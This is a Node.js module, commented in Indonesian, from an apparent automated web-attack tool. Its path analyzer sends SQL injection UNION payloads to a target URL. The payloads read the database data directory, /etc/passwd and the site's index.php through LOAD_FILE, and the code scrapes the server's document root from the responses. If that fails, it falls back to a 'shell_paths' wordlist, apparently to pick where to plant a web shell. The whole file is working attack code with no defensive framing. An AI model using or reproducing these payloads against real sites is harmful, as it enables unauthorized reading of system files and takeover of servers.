const { httpRequest } = require('./engine');
const { loadPayloads } = require('./utils');
const chalk = require('chalk');

async function analyzePath(targetUrl, vulnType) {
    console.log(chalk.cyan(`\n[*] Memulai Path Analyzer untuk: ${targetUrl}`));
    let detectedPaths = [];

    if (vulnType.includes('SQL Injection')) {
        console.log(chalk.yellow(`    [+] Mencari Document Root via SQLi...`));
        
        // Payload untuk mencari direktori data (bisa jadi petunjuk path)
        const payloads = [
            "UNION SELECT 1,@@datadir,3--",
            "UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
            "UNION SELECT 1,LOAD_FILE('/var/www/html/index.php'),3--"
        ];

        // Kita asumsikan URL sudah dalam bentuk http://target.com/page.php?id=1
        // Ambil base URL untuk injeksi
        const baseUrl = targetUrl.substring(0, targetUrl.lastIndexOf('=') + 1);

        for (const payload of payloads) {
            const testUrl = baseUrl + encodeURIComponent(payload);
            const res = await httpRequest(testUrl);

            // Jika respons mengandung path standar Linux
            if (res.data.includes('/var/www/') || res.data.includes('/home/') || res.data.includes('C:\\xampp\\htdocs\\')) {
                // Ekstraksi path dari response (regex sederhana)
                const match = res.data.match(/(\/(var\/www|home)[^\s]*)/);
                if (match) {
                    detectedPaths.push(match[1]);
                    console.log(chalk.green(`    [V] Path ditemukan: ${match[1]}`));
                }
            }
        }
    }

    // Jika analisa gagal, muat path default dari wordlist
    if (detectedPaths.length === 0) {
        console.log(chalk.yellow(`    [-] Gagal mendeteksi path. Menggunakan wordlist default.`));
        detectedPaths = loadPayloads('shell_paths');
    }

    // Hilangkan duplikat
    return [...new Set(detectedPaths)];
}

module.exports = { analyzePath };